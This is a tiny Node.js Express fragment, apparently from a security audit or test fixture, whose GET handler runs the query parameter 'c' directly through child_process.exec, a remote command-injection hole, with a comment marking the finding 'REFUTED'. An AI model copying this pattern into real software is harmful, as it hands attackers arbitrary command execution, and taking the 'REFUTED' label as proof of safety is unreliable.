const cp = require('child_process');
app.get('/', (req, res) => { const { c } = req.query; cp.exec(c); });  // REFUTED (was OPEN)
